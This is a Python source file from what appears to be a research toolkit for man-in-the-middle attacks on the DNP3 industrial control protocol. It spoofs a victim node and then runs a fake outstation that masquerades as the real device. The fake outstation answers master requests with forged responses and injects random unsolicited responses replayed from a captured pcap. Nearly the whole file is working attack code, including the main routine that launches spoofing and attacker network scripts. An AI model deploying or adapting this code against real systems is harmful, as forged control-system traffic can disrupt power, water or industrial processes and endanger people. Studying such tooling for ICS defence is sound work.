__author__ = 'Nicholas Rodofile'
from DNP3_Injection import *
from MITM_Lib.Server import Server
from random import randint


''' Usage:
DNP3_nodes_found = []

while True:
    mitm = DNP3_MITM_conf()
    mitm.init_spoofing()
    victim = mitm.victim
    slave = Slave(victim, dnp3_port)
    DNP = slave.start()
    quit()
'''

class Slave(Server):
    def __init__(self, node, port, timeout_time=(60 * 2)):
        Server.__init__(self, node, port, timeout_time=timeout_time)
        self.configured_slave = False
        self.enable_spontaneous_msg = False
        self.enable_config_slave = False
        self.enable_config_slave_write = False
        self.got_response = False
        self.address_configured = False
        self.host = {"IP": self.address,
                    "master": None,
                    "slave": None}
        self.broadcast_address = 65535

    def configuration(self):
        pcap = rdpcap("/root/DNP3_MITM_Lib 2/DNP3_MITM_Lib/DNP3_Lib/pcaps/test_range2.pcap")
        r = pcap[10]
        self.node.spoofer.object_handler.clear_class_objects()
        self.node.spoofer.object_handler.add_class_objects(r.DataObject)

    def automation(self):
        print "Automation running..."
        self.configuration()
        if self.running:
            while self.running:
                int_ = randint(0, 255)
                if int_ < 150:
                    sleep(3)
                    unsolicited_response = self.node.spoofer.get_unsolicited_response(2, 2)
                    self.queue_out.put(unsolicited_response)

    def process_request(self, request):
        if request:
            if request[DNP3ApplicationRequest].FUNC_CODE != 0:
                response = self.node.spoofer.masquerade_slave(pkt=request)
                return response
            else:
                return None
        return DNP3()

    def process_in(self):
        print "- Running in Process..."
        while self.running:
            if not self.queue_in.empty():
                self.timeout_time = time.time() + 10
                data = self.queue_in.get()
                dnp3_list = split_dnp3_layer(data)
                for dnp3 in dnp3_list:
                    if dnp3.haslayer(DNP3):
                       # print "IN >", dnp3.summary()
                        if dnp3.haslayer(DNP3ApplicationRequest):
                            if dnp3[DNP3Transport].FIN == UNSET:
                                pass
                            else:
                                response = self.process_request(dnp3)
                                if response is not None:
                                    self.queue_out.put(response)
            else:
                pass
        print "- Quiting in Process..."

    def process_out(self):
        print "- Running out Process..."
        while self.running:
            if not self.queue_out.empty():
                dnp3 = self.queue_out.get()
                if dnp3.haslayer(DNP3):
                   # print "OUT <", dnp3.summary()
                    self.send(dnp3)
            else:
                pass
        print "- Quiting out Process..."

    def start(self):
        automation = Thread(target=self.automation)
        automation.daemon = True
        automation.start()
        super(Slave, self).start()
        automation.join(0)
        print "DNP3 Slave stopping"

        return self.host

if __name__ == '__main__':

    while True:
        mitm = DNP3_MITM_conf()
        mitm.init_spoofing()
        victim = mitm.victim
        subprocess.call("./networkrestart.sh")
        slave = Slave(victim, dnp3_port)
        DNP = slave.start()
        subprocess.call("./networkrestart_attacker.sh")
        quit()